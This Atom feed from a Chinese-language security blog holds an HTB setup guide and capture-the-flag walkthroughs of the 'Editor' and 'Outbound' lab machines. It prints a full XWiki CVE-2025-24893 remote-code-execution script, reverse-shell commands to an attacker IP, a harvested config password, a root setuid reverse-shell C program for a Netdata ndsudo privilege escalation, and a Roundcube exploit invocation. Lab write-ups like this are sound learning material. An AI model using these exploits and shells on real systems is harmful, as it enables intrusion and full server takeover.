<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>2in9ya2 Blog</title>
  
  <subtitle>For the future me</subtitle>
  <link href="https://2in9ya2.github.io/atom.xml" rel="self"/>
  
  <link href="https://2in9ya2.github.io/"/>
  <updated>2025-08-13T05:11:30.617Z</updated>
  <id>https://2in9ya2.github.io/</id>
  
  <author>
    <name>2in9ya2</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>How to use HTB?</title>
    <link href="https://2in9ya2.github.io/how-to-use-htb/"/>
    <id>https://2in9ya2.github.io/how-to-use-htb/</id>
    <published>2025-08-13T05:11:30.617Z</published>
    <updated>2025-08-13T05:11:30.617Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTB"><a href="#HTB" class="headerlink" title="HTB"></a>HTB</h1><span id="more"></span><h2 id="什么是HTB？"><a href="#什么是HTB？" class="headerlink" title="什么是HTB？"></a>什么是HTB？</h2><p><a href="https://www.hackthebox.com/">Hack The Box</a> 是一个在线平台，用户可以在其中练习黑客技术、漏洞利用、权限提升、逆向分析等网络安全相关技能。它通过各种<strong>挑战（Challenges）和靶机（Machines）</strong>来模拟现实世界中的漏洞环境。</p><h2 id="HTB-VIP-和-HTB-Academy-VIP的区别"><a href="#HTB-VIP-和-HTB-Academy-VIP的区别" class="headerlink" title="HTB VIP 和 HTB Academy VIP的区别"></a>HTB VIP 和 HTB Academy VIP的区别</h2><p>HTB VIP 主要面向想要提升实战渗透能力的用户，提供大量靶机、官方题解、以及完整挑战环境；而 HTB Academy VIP 则更偏向系统化学习，提供结构化课程与配套实验靶场，适合入门学习或打牢理论基础的用户。两者分别侧重“练”与“学”，互为补充。</p><p>HTB Academy VIP更适合0基础的，HTB VIP适合有一定基础的。</p><h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>在<a href="https://account.hackthebox.com/register">注册网站</a>进行注册，步骤省略。</p><h3 id="登录以及使用"><a href="#登录以及使用" class="headerlink" title="登录以及使用"></a>登录以及使用</h3><p>登录后选择HTB Lab进入。<br><img src="/../images/dd0cf5cc7a0a4d370377f2e2b68d80e5bcbbac38441a9b45711ab3b17098a91f.png" alt="picture 0"></p><p>新手直接选择<br><code>Stating Point</code><br><img src="/../images/0805c62f7967b4cb6b0bc772bb9c505d11e56d9341d8e7c74d3fd160860da20d.png" alt="picture 1"></p><p>进入之后选择右上角</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONNECT TO HTB</span><br></pre></td></tr></table></figure><p><img src="/../images/58f1b34a9c3d80382a1b229fc919a1a7780172a2cebc6c5e0cda425fdb5f9239.png" alt="picture 2"></p><p>接着选择<code>Starting Point</code>来进行连接，这是面向新手的教学专区，里面提供了一些免费的靶机供你练习。<br><img src="/../images/eab444c876a51a9506093eee2e210f63bf87adc52108fcd793db68ec6026df58.png" alt="picture 3"><br>接下来选择 <code>OpenVPN</code> 进行连接。<code>Pwnbox</code> 是 <code>HTB</code> 提供的基于网页的渗透测试环境，使用方便，但仅限会员用户使用。<br><img src="/../images/997aedba180e79f698d75a43766a7f45266d2bbc0c631c591b9c5825f37dda73.png" alt="picture 4"></p><p>点击后可以选择不同的连接协议，默认推荐使用<code>UDP</code>，如果无法连接，可切换为 <code>TCP</code>。选择合适的协议后，下载对应的 VPN 配置文件，并将其导入到<code>OpenVPN</code>中进行连接。<br><img src="/../images/e6e43090b6d4825d95138a2efe1ffcb4024081aff49ef884ce666dd2ad3892e7.png" alt="picture 5"><br>绿色之后就可以选择相应的<code>Machine</code>进行渗透啦。<br><img src="/../images/2cb530d9dccdc353b67f37aebeda55629421bf7f5a350cf8796e24eaf2f1f762.png" alt="picture 6">  </p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>如果你想使用 HTB Academy 并购买会员，通常需要一个国外教育邮箱（.edu）。你可以通过网站<a href="https://edumail.vip/?aff=13988">EDUEmailShop</a>购买该类邮箱。<br>购买邮箱后，使用它注册<code>HTB Academy</code>账号。注册完成后，前往<code>Academy</code>页面开通会员，每月费用为 8 美元。<br>建议使用<code>PayPal</code>绑定国内银行卡进行支付，便捷且支持自动续费。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;HTB&quot;&gt;&lt;a href=&quot;#HTB&quot; class=&quot;headerlink&quot; title=&quot;HTB&quot;&gt;&lt;/a&gt;HTB&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwned-Exploiting HTB Editor</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Editor/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Editor/</id>
    <published>2025-08-13T05:11:30.616Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Editor"><a href="#Editor" class="headerlink" title="Editor"></a>Editor</h1><span id="more"></span><h2 id="第一步先上nmap进行扫描"><a href="#第一步先上nmap进行扫描" class="headerlink" title="第一步先上nmap进行扫描"></a>第一步先上nmap进行扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC --min-rate 1000 --max-retries 1 10.10.11.80 --verbose</span><br></pre></td></tr></table></figure><p><img src="/../images/93fd5292d89833dfac894a55a148b0070024d50bb4ef75aa84419e11887bf487.png" alt="picture 0">  </p><p>扫描结果显示目标主机开放了 <code>22、80</code> 和 <code>8080 </code>端口，其中 <code>80</code> 与 <code>8080</code> 端口表明其运行了 <code>HTTP</code> 服务。</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>访问目标的 <code>HTTP</code> 服务时发现无法正常响应，经检查需要将目标域名手动添加到<code>/etc/hosts</code>中才能访问。<br><img src="/../images/842719db7d5e5ec2cc94b1ee6afd2b56bb4d5be53c45238767eb68a184702b8f.png" alt="picture 1"></p><p>进入网站后发现页面内容较为简单，没有明显可利用的渗透点。随后尝试访问其 <code>8080</code> 端口。<br><img src="/../images/2de75a7f965ada74b0ed9fedc83f8a0c25899371570cfe418da76a2184de7910.png" alt="picture 2">  </p><p>识别到目标运行的版本为 <code>XWiki Debian 15.10.8</code>，随后在 <code>Exploit-DB</code> 中检索到该版本存在已知漏洞，可被利用进行进一步渗透。</p><p><img src="/../images/30a45188980f73a76e6494d337c4e9de1ab4267da25a5044cacaa975771c9495.png" alt="picture 4"> </p><p>但是给出的<code>POC</code>无法使用，故寻找其他的<code>POC</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define color dictionary</span></span><br><span class="line">color = &#123;</span><br><span class="line">    <span class="string">&quot;NC&quot;</span>: <span class="string">&#x27;\033[0m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;RED&quot;</span>: <span class="string">&#x27;\033[91m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;GREEN&quot;</span>: <span class="string">&#x27;\033[92m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;YELLOW&quot;</span>: <span class="string">&#x27;\033[93m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;BLUE&quot;</span>: <span class="string">&#x27;\033[94m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;MAGENTA&quot;</span>: <span class="string">&#x27;\033[95m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;CYAN&quot;</span>: <span class="string">&#x27;\033[96m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;WHITE&quot;</span>: <span class="string">&#x27;\033[97m&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define some pretty characters</span></span><br><span class="line">STAR: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>[<span class="subst">&#123;color[<span class="string">&#x27;BLUE&#x27;</span>]&#125;</span>*<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>]<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">WARNING_STR: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>[<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>!<span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>]<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ctrl+C</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signal_handler</span>(<span class="params">sig, frame</span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;WARNING_STR&#125;</span> <span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>Ctrl+C! Exiting...<span class="subst">&#123;color[<span class="string">&#x27;RESET&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>()-&gt;argparse.Namespace:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get arguments from user</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Create an ArgumentParser object</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">f&quot;<span class="subst">&#123;color[<span class="string">&#x27;BLUE&#x27;</span>]&#125;</span>CVE-2025-24893<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span> exploit by <span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>gunzf0x<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">                                     epilog=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>Example usage:<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">&#123;color[<span class="string">&#x27;GREEN&#x27;</span>]&#125;</span>python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> -t &#x27;http://example.com:8080&#x27; -c &#x27;ping -c1 10.10.10.10&#x27;<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawTextHelpFormatter)</span><br><span class="line">    <span class="comment"># Add arguments with flags</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url. For example: &#x27;http://example.com&#x27; or &#x27;http://example.com:8080&#x27;&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--command&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;System command to execute in the target machine&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># Return the parsed arguments</span></span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">original_url: <span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check if url provided is in correct format</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> original_url.startswith(<span class="string">&quot;http://&quot;</span>) <span class="keyword">or</span> <span class="keyword">not</span> original_url.startswith(<span class="string">&quot;https://&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;WARNING_STR&#125;</span> protocol not found in url (HTTP or HTTPs). Assumming it is &#x27;https&#x27; adding &#x27;http://&#x27; string to url...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;http://&#x27;</span> + original_url</span><br><span class="line">    <span class="keyword">return</span> original_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target: <span class="built_in">str</span>, command: <span class="built_in">str</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exploit for CVE-2025-24893 attacking vulnerable endpoint</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Set target url</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;STAR&#125;</span> Attacking <span class="subst">&#123;color[<span class="string">&#x27;CYAN&#x27;</span>]&#125;</span><span class="subst">&#123;target&#125;</span><span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    url_payload: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;target[:-<span class="number">1</span>] <span class="keyword">if</span> target.endswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">else</span> target&#125;</span>/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=&quot;</span></span><br><span class="line">    original_payload: <span class="built_in">str</span> = <span class="string">f&#x27;&#125;&#125;&#125;&#125;&#123;&#123;&#123;&#123;async async=false&#125;&#125;&#125;&#125;&#123;&#123;&#123;&#123;groovy&#125;&#125;&#125;&#125;&quot;<span class="subst">&#123;command&#125;</span>&quot;.execute()&#123;&#123;&#123;&#123;/groovy&#125;&#125;&#125;&#125;&#123;&#123;&#123;&#123;/async&#125;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">    encoded_payload: <span class="built_in">str</span>  = urllib.parse.quote(original_payload)</span><br><span class="line">    vulnerable_endpoint: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;url_payload&#125;</span><span class="subst">&#123;encoded_payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;STAR&#125;</span> Injecting the payload:\n<span class="subst">&#123;color[<span class="string">&#x27;CYAN&#x27;</span>]&#125;</span><span class="subst">&#123;vulnerable_endpoint&#125;</span><span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(vulnerable_endpoint, verify=<span class="literal">False</span>, timeout=<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;WARNING_STR&#125;</span> <span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>An error ocurred:\n<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;STAR&#125;</span> <span class="subst">&#123;color[<span class="string">&#x27;MAGENTA&#x27;</span>]&#125;</span>Command executed<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n~Happy Hacking&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>()-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Get arguments form user</span></span><br><span class="line">    args: argparse.Namespace = parse_arguments()</span><br><span class="line">    <span class="comment"># Execute the exploit attacking the vulnerable endpoint</span></span><br><span class="line">    exploit(args.target, args.command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用该脚本对网站进行<code>反弹shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先攻击端进行端口监听</span></span><br><span class="line">ncat -lnvp 4444</span><br><span class="line"><span class="comment"># 之后进行反弹shelll，不知道为什么加busybox的自行查阅</span></span><br><span class="line">python CVE-2024-24893.py -t http://wiki.editor.htb/ -c <span class="string">&#x27;busybox nc 10.10.16.3 4444 -e /bin/bash&#x27;</span></span><br><span class="line"><span class="comment"># 开启交互式终端便于操作</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/94b3aba757b9d9bab8664a8cc279ad607afde815558e60d8cdc1708426193643.png" alt="picture 5">  </p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入home后发现有个名为oliver的用户</span></span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回到刚进来时的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /usr/lib/xwiki-jetty</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过询问gpt，可以获取相关的结构信息，找到一个名为hibernate.cfg.xml的配置文件，通过该命令发现其中存在密码，密码为</span></span><br><span class="line"><span class="comment"># theEd1t0rTeam99</span></span><br><span class="line">grep passw* hibernate.cfg.xml </span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面尝试进行ssh连接</span></span><br><span class="line">ssh oliver@10.10.11.80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发现连接成功，获得user flag</span></span><br><span class="line">oliver@editor:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">9afa9913d95e68e660182441f4d2c3e4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面尝试进行root提权，看看有没有什么是root下面执行，发现没有</span></span><br><span class="line">oliver@editor:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> oliver: </span><br><span class="line">Sorry, user oliver may not run sudo on editor.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网络监听情况，发现其有若干的端口监听服务，一个一个看，进行端口转发</span></span><br><span class="line">netstat -nutl</span><br></pre></td></tr></table></figure><p><img src="/../images/b0b38a0125449b6b55dd9827d2996077b6eeb159c98a4ce5304da80f8e8ad1d2.png" alt="picture 6">  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行端口转发，这样就可以远程访问19999端口啦</span></span><br><span class="line">ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80</span><br></pre></td></tr></table></figure><p>发现为<code>Netdata</code>网站，并且进去有红色升级提醒，那就看看是否存在漏洞。<br><img src="/../images/ff4fe9bb60cfc95dd4b28e1bb0816b10efa6eb62a7a29ef31727f15e5abbac38.png" alt="picture 7">  </p><p>查阅后发现确实存在漏洞，编号为<code>CVE-2024-32019</code>。受影响的 <code>Netdata Agent</code> 版本附带的工具<code>ndsudo</code>允许攻击者以<code>root</code>权限运行任意程序。通过google找到了相应的<code>POC</code>。<a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">CVE-2024-32019-POC</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先按照他的POC找到该文件的位置</span></span><br><span class="line">oliver@editor:~$ find / -name ndsudo 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 位置为</span></span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行一下</span></span><br><span class="line">oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">nvme : not available <span class="keyword">in</span> PATH.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 按照他给的代码改动再次反弹shell</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">// for setuid, setgid, execl</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span> <span class="comment">// for NULL</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.3/9999 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先编译一下，因为我的电脑为M4版本Mac电脑，需要使用docker才能编译为x86_64的</span></span><br><span class="line">docker run --<span class="built_in">rm</span> --platform linux/amd64 -v <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span>:/src -w /src ubuntu:latest bash -c <span class="string">&quot;apt update &amp;&amp; apt install -y build-essential &amp;&amp; gcc -o nvme exploit.c -static&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到nvme之后将其传入到目标机器</span></span><br><span class="line">scp oliver@10.10.11.80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改其可执行权限，并把所在目录加入到PATH</span></span><br><span class="line"><span class="built_in">chmod</span> +x nvme</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令 即可以root身份反弹shell</span></span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br></pre></td></tr></table></figure><h2 id="又学到了T-T"><a href="#又学到了T-T" class="headerlink" title="又学到了T_T"></a>又学到了T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Editor&quot;&gt;&lt;a href=&quot;#Editor&quot; class=&quot;headerlink&quot; title=&quot;Editor&quot;&gt;&lt;/a&gt;Editor&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwned-Exploiting HTB Outbound</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Outbound/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Outbound/</id>
    <published>2025-08-13T05:11:30.616Z</published>
    <updated>2025-08-13T05:11:30.617Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Outbound"><a href="#Outbound" class="headerlink" title="Outbound"></a>Outbound</h1><span id="more"></span><h2 id="第一步用nmap进行扫描"><a href="#第一步用nmap进行扫描" class="headerlink" title="第一步用nmap进行扫描"></a>第一步用nmap进行扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC --min-rate 1000 --max-retries 1 10.10.11.73 --verbose</span><br></pre></td></tr></table></figure><p>发现有<code>22、80</code>端口。<br><img src="/../images/57cd011af47f3ed3e4e5d4f8f4453f381e809e3988e5eacc84c6de690ff76f39.png" alt="picture 0"><br>那就看看<code>80</code>端口服务，是个邮箱系统，直接把<code>php</code>代码甩给<code>gpt</code>，发现系统为<code>Roundcube Webmail 1.6.10</code>，那就开始找是否存在漏洞。</p><p><img src="/../images/49efef24ebf6777d6e6a23970e29efa9bc377e0c7eb036248b3ce185e832bfe9.png" alt="picture 1">  </p><p>那就去找<code>POC</code>，<a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">CVE-2025-27591-PoC</a>。</p><p>按照<code>HTB</code>的账号密码提示，以及<code>POC</code>的脚本执行命令，直接执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先开启监听端口</span></span><br><span class="line">ncat -lvnp 4444</span><br><span class="line"></span><br><span class="line">php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.3/4444 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>直接反弹<code>shell</code><br><img src="/../images/a0ec942d9f59ffbe30c244c7246d4bd5d170b535ba6aec2525727c7c868ae862.png" alt="picture 2">  </p><p>下一步就看看有啥能利用的，先切换到提示用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 